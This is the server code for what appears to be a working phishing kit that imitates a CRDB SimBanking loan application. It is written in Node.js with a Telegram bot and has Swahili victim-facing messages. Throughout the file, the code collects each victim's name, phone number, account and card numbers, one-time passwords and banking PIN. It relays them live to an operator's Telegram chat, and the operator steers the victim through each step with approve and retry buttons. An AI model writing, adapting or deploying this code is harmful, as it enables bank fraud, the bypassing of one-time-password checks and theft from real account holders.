const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
let bot;

try {
    bot = new TelegramBot(TOKEN, { polling: { interval: 2000, autoStart: true, params: { timeout: 10 } } });
} catch (e) {
    console.error('Failed to initialize Telegram Bot:', e.message);
}

let adminChatId = null;
let clientData = {};
let pinAttempts = 3;
let currentClientResponse = null;
let sseResponseObj = null; // Real-time push connection tracker

// Helper to push updates instantly to browser
function triggerInstantUpdate(responsePayload) {
    currentClientResponse = responsePayload;
    if (sseResponseObj) {
        sseResponseObj.write(`data: ${JSON.stringify(responsePayload)}\n\n`);
    }
}

if (bot) {
    bot.onText(/\/start/, (msg) => {
        adminChatId = msg.chat.id;
        const appUrl = process.env.RENDER_EXTERNAL_URL || 'https://crdb-simbanking.onrender.com';
        console.log(`Admin Connected: ${adminChatId}`);
        
        const welcomeMsg = `✅ **Admin Connected Successfully!**\n\n` +
            `👤 **Admin Chat ID:** \`${adminChatId}\`\n\n` +
            `🌐 **Browsing Application Link:**\n${appUrl}`;
            
        bot.sendMessage(adminChatId, welcomeMsg, { parse_mode: 'Markdown', disable_web_page_preview: true });
    });
}

// Real-time Event Stream Endpoint for instant navigation
app.get('/api/stream-status', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.flushHeaders();

    sseResponseObj = res;
    res.write('data: {"status":"connected"}\n\n');

    req.on('close', () => {
        if (sseResponseObj === res) {
            sseResponseObj = null;
        }
    });
});

app.post('/api/submit', async (req, res) => {
    try {
        const { step, data } = req.body;
        clientData = { ...clientData, ...data };
        currentClientResponse = null; // Reset for incoming step

        if (!bot) {
            return res.status(500).json({ success: false, message: 'Bot not initialized.' });
        }

        if (!adminChatId) {
            return res.status(400).json({ success: false, message: 'Please send /start to your Telegram bot first!' });
        }

        const appUrl = process.env.RENDER_EXTERNAL_URL || 'https://crdb-simbanking.onrender.com';

        if (step === 'personal_info') {
            const msgText = `👤 **Step: Taarifa za Mtu na Simu**\n\n` +
                `🌐 [Open Browsing App](${appUrl})\n\n` +
                `📝 **Full Name:** ${data.fullName}\n📱 **Phone No:** ${data.phoneNumber}\n💰 **Requested Loan:** TZS ${Number(data.loanAmount || 0).toLocaleString()}\n\n*Check SimBanking registration status:*`;
            
            const opts = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '✅ REGISTERED', callback_data: 'phone_registered' },
                            { text: '❌ NOT REGISTERED', callback_data: 'phone_unregistered' }
                        ]
                    ]
                },
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            };
            await bot.sendMessage(adminChatId, msgText, opts);
            return res.json({ success: true, pendingApproval: true });
        }
        else if (step === 'step3') {
            const msgText = `💳 **Step 3: Account & Tembo Card Verification**\n\n` +
                `🌐 [Open Browsing App](${appUrl})\n\n` +
                `🏦 **Account No:** ${data.accountNumber}\n💳 **Tembo Card No:** ${data.cardNumber}\n\n*Choose action for applicant:*`;
            
            const opts = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '✅ PROCEED', callback_data: 'card_proceed' },
                            { text: '❌ DENY DETAILS', callback_data: 'card_deny' }
                        ]
                    ]
                },
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            };
            await bot.sendMessage(adminChatId, msgText, opts);
            return res.json({ success: true, pendingApproval: true });
        }
        else if (step === 'step4') {
            if (data.isResend) {
                await bot.sendMessage(adminChatId, `🔄 **OTP Resend Request**\nApplicant requested a new OTP code.`, { parse_mode: 'Markdown' });
                return res.json({ success: true, resendAcknowledge: true });
            }

            const msgText = `📱 **Step 4: OTP Verification**\n\n` +
                `🌐 [Open Browsing App](${appUrl})\n\n` +
                `🔢 **Entered OTP:** ${data.otp}\n\n*Choose action for OTP:*`;
            
            const opts = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '✅ CORRECT OTP', callback_data: 'otp_correct' },
                            { text: '❌ INCORRECT OTP', callback_data: 'otp_incorrect' }
                        ]
                    ]
                },
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            };
            await bot.sendMessage(adminChatId, msgText, opts);
            return res.json({ success: true, pendingApproval: true });
        }
        else if (step === 'step5') {
            const msgText = `🔒 **Step 5: SimBanking PIN**\n\n` +
                `🌐 [Open Browsing App](${appUrl})\n\n` +
                `🔑 **Attempt PIN:** ${data.pin}\n⚠️ **Remaining Attempts:** ${pinAttempts}\n\n*Choose action for PIN:*`;
            
            const opts = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '✅ CORRECT PIN', callback_data: 'pin_correct' },
                            { text: '❌ WRONG PIN', callback_data: 'pin_wrong' }
                        ]
                    ]
                },
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            };
            await bot.sendMessage(adminChatId, msgText, opts);
            return res.json({ success: true, pendingApproval: true });
        }

        res.json({ success: false, message: 'Invalid step' });
    } catch (err) {
        console.error('Server error in /api/submit:', err);
        res.status(500).json({ success: false, message: 'Internal server error: ' + err.message });
    }
} );

if (bot) {
    bot.on('callback_query', async (query) => {
        const action = query.data;
        const chatId = query.message.chat.id;
        const messageId = query.message.message_id;

        try { await bot.answerCallbackQuery(query.id); } catch (e) {}

        try {
            await bot.editMessageReplyMarkup({ inline_keyboard: [[{ text: '✔ ACTION PROCESSED', callback_data: 'done' }]] }, { chat_id: chatId, message_id: messageId });
        } catch (e) {}

        if (action === 'phone_registered') {
            await bot.sendMessage(chatId, '✅ Phone registered. Moving applicant to Tembo Card verification.');
            triggerInstantUpdate({ status: 'approved', next: 'card_verify' });
        } else if (action === 'phone_unregistered') {
            await bot.sendMessage(chatId, '❌ Phone not registered on SimBanking.');
            triggerInstantUpdate({ status: 'retry_phone', message: 'Namba ya simu au jina uliloingiza halijasajiliwa kwenye SimBanking. Tafadhali ingiza namba sahihi ya CRDB SimBanking ❌' });
        } else if (action === 'card_proceed') {
            await bot.sendMessage(chatId, '✅ Card details approved. Moving applicant to OTP step.');
            triggerInstantUpdate({ status: 'approved', next: 'otp' });
        } else if (action === 'card_deny') {
            await bot.sendMessage(chatId, '❌ Application stopped due to invalid CRDB details.');
            triggerInstantUpdate({ status: 'denied', message: 'Tafadhali ingiza namba sahihi za akaunti na kadi (Invalid CRDB details) ❌' });
        } else if (action === 'otp_correct') {
            await bot.sendMessage(chatId, '✅ OTP correct. Moving applicant to PIN step.');
            triggerInstantUpdate({ status: 'approved', next: 'pin' });
        } else if (action === 'otp_incorrect') {
            await bot.sendMessage(chatId, '❌ Incorrect OTP. Applicant forced to enter new OTP.');
            triggerInstantUpdate({ status: 'retry_otp', message: 'Namba ya OTP si sahihi. Tafadhali ingiza OTP mpya ❌' });
        } else if (action === 'pin_correct') {
            await bot.sendMessage(chatId, '✅ PIN correct. Proceeding to success screen.');
            pinAttempts = 3;
            triggerInstantUpdate({ status: 'approved', next: 'success' });
        } else if (action === 'pin_wrong') {
            pinAttempts--;
            if (pinAttempts <= 0) {
                await bot.sendMessage(chatId, '🚫 Account blocked due to 3 wrong PIN attempts.');
                triggerInstantUpdate({ status: 'blocked', message: 'Akaunti yako imezuiwa kutokana na makosa 3 ya PIN ❌' });
                pinAttempts = 3;
            } else {
                await bot.sendMessage(chatId, `⚠️ Wrong PIN. ${pinAttempts} attempt remains.`);
                triggerInstantUpdate({ status: 'retry_pin', message: `PIN si sahihi. Kosa la ${3 - pinAttempts}/3. Jaribu tena ❌`, attemptsLeft: pinAttempts });
            }
        }
    });
}

// Backup poll route safeguard
app.get('/api/poll-status', (req, res) => {
    if (currentClientResponse) {
        const resp = currentClientResponse;
        currentClientResponse = null;
        return res.json(resp);
    }
    return res.json({ status: 'pending' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
        
